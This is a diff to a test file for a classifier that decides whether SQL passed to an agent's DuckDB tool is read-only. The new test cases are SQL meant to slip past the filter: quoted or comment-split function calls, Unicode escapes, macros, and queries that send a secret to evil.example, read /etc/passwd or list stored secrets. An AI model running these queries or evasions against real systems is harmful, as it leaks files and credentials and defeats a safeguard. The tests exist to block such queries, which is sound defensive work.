@@ -50,9 +50,12 @@ const READ_ONLY = [
   "SELECT * FROM train WHERE Name LIKE '%update%'",
   "SELECT 'DROP TABLE t; --' AS s",
   "SELECT 'it''s' AS s",
-  'SELECT "update", "set" FROM t',
   'SELECT "a"";""b" FROM t',
   'SELECT a AS "Insert Date" FROM t',
+  // Quoted names that are not function calls, keywords or external words.
+  'SELECT "Survived", t."Pclass", "glob count", "x read_csv" FROM train t',
+  'SELECT "Name" FROM t WHERE "Age" IN (1, 2) ORDER BY ("Fare")',
+  'SELECT "a" AS "b", count(*) FROM t GROUP BY "a"',
   // Lowercase, CTEs, newlines and tabs.
   'with s as (\n\tselect sex, count(*) as n from train group by sex\n)\nselect * from s order by n desc;',
   'WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 3) SELECT * FROM r',
@@ -151,6 +154,51 @@ const NOT_READ_ONLY = [
   "SUMMARIZE 'https://evil.example/x.csv'",
   "SELECT 'https://evil.example/?' || secret FROM t",
   "PRAGMA table_info('a.csv')",
+  // A quoted name is resolved like a bare one, and called by a `(` after it
+  // (re-review finding N1): every one of these runs in DuckDB 1.4.
+  `SELECT * FROM "read_csv"('https:' || '//evil.example/?d=secret')`,
+  `SELECT * FROM "query"('SELECT 42')`,
+  `SELECT * FROM "read_text"('/etc/passwd')`,
+  `SELECT * FROM "glob"('*')`,
+  `SELECT * FROM "GLOB"('*')`,
+  `SELECT "getenv"('HOME')`,
+  `SELECT "getenv" ('HOME')`,
+  `SELECT * FROM main."glob"('*')`,
+  `SELECT * FROM system.main."read_csv"('x')`,
+  `SELECT * FROM system.main.read_csv('x')`,
+  `SELECT * FROM "parquet_metadata"('x' || '.parquet')`,
+  `SELECT * FROM "query_table"('t')`,
+  `SELECT * FROM "Query_Table"('t')`,
+  // A function name split from its `(` by a comment, and any quoted call.
+  `SELECT * FROM "glob"/**/('*')`,
+  `SELECT * FROM "glob" -- x\n('*')`,
+  `SELECT * FROM glob/**/('*')`,
+  `SELECT * FROM "my_macro"('x')`,
+  `SELECT "lower"('A')`,
+  // A quoted name that is a keyword or external word, called or not.
+  'SELECT "glob" FROM t',
+  'SELECT "set", "update" FROM t',
+  'SELECT * FROM "read_csv"',
+  'SELECT "a" "glob" FROM t',
+  // Unicode escapes can spell any name (not implemented in DuckDB 1.4).
+  `SELECT * FROM U&"!0067lob"('*') UESCAPE '!'`,
+  `SELECT U&"d!0061ta" UESCAPE '!' FROM t`,
+  `SELECT U&"d!0061ta" FROM t`,
+  `SELECT U&'!0067' UESCAPE '!'`,
+  // Other ways to reach a reader or run SQL by another name.
+  'FROM read_csv AS x',
+  "SELECT * FROM query_table('t')",
+  'CREATE MACRO m(p) AS TABLE FROM read_csv(p)',
+  'CREATE MACRO m() AS TABLE SELECT 1',
+  'PREPARE p AS SELECT 1',
+  'EXECUTE p',
+  "COPY (SELECT 1) TO '/scratchpad/' || 'x.csv'",
+  "SELECT * FROM ST_ReadOSM('x.pbf')",
+  'FROM duckdb_secrets()',
+  "FROM which_secret('s3://x/y', 's3')",
+  'FROM enable_logging()',
+  'FROM force_checkpoint()',
+  'FROM truncate_duckdb_logs()',
 ];
 
 describe('isReadOnlySql', () => {
@@ -177,12 +225,18 @@ describe('every write keyword', () => {
       expect(isReadOnlySql(`WITH x AS (SELECT 1) SELECT ${k}(x) FROM x`)).toBe(false);
     }
   });
-  it.each(SQL_WRITE_KEYWORDS)('%s is only text in a string, quoted identifier or comment', (kw) => {
+  it.each(SQL_WRITE_KEYWORDS)('%s is an effect as a whole quoted name too, which DuckDB resolves as the bare word', (kw) => {
+    for (const k of [kw, kw.toLowerCase()]) {
+      expect(isReadOnlySql(`SELECT "${k}" FROM t`)).toBe(false);
+      expect(isReadOnlySql(`SELECT * FROM "${k}"('x')`)).toBe(false);
+    }
+  });
+  it.each(SQL_WRITE_KEYWORDS)('%s is only text in a string, a longer quoted name or a comment', (kw) => {
     expect(isReadOnlySql(`SELECT '${kw}' FROM t`)).toBe(true);
-    expect(isReadOnlySql(`SELECT "${kw}" FROM t`)).toBe(true);
+    expect(isReadOnlySql(`SELECT "${kw} x" FROM t`)).toBe(true);
     expect(isReadOnlySql(`SELECT 1 -- ${kw}`)).toBe(true);
     expect(isReadOnlySql(`SELECT /* ${kw} */ 1`)).toBe(true);
-    expect(isReadOnlySql(`EXPLAIN ANALYZE SELECT a AS "${kw}" FROM t`)).toBe(true);
+    expect(isReadOnlySql(`EXPLAIN ANALYZE SELECT a AS "my ${kw}" FROM t`)).toBe(true);
     // Part of a longer word is not the keyword.
     expect(isReadOnlySql(`SELECT ${kw}_x, x_${kw} FROM t`)).toBe(true);
   });
@@ -308,6 +362,30 @@ describe.skipIf(!wheelImports)(`the rules as the ZEOS wheel applies them${wheelI
     );
     expect(verdicts).toEqual(cases.map(isReadOnlySql));
     expect(verdicts).toEqual(cases.map((sql) => classifyToolCall('RunSQL', { sql }) === 'read'));
+  });
+
+  // Python's IGNORECASE without re.ASCII matches these four against [A-Za-z]
+  // (they case-fold to ASCII letters); RegExp without `u` does not (N2). ZEOS
+  // compiles read_if rules with re.ASCII; until the wheels in public/zeos are
+  // synced from a ZEOS commit that does, this test fails.
+  it('agrees on non-ASCII letters that case-fold to ASCII (needs re.ASCII in the wheel)', () => {
+    const cases = ['ſ', 'K', 'İ', 'ı'].flatMap((ch) => [
+      `SELECT 1 AS ${ch}set`,
+      `SELECT ${ch}load FROM t`,
+      `SELECT 1 AS ${ch}nto`,
+      `SELECT 1 AS ${ch}et`,
+      `SELECT 1 AS se${ch}`,
+      `SELECT "${ch}et" FROM t`,
+      `SELECT * FROM "${ch}nto"`,
+      `SELECT * FROM "glob${ch}"`,
+      `SELECT 1 AS chec${ch}point`,
+    ]);
+    const verdicts = runWheel(
+      'rule = cm._compile_rule(data["rule"])\n' +
+        'print(json.dumps([cm._rule_matches(rule, {"sql": c}) for c in data["cases"]]))\n',
+      { rule: (ZEOS_TOOL_CLASSES.RunSQL as { read_if: Record<string, string> }).read_if, cases },
+    );
+    expect(verdicts).toEqual(cases.map(isReadOnlySql));
   });
 
   it('agrees on the trusted-results rule', () => {
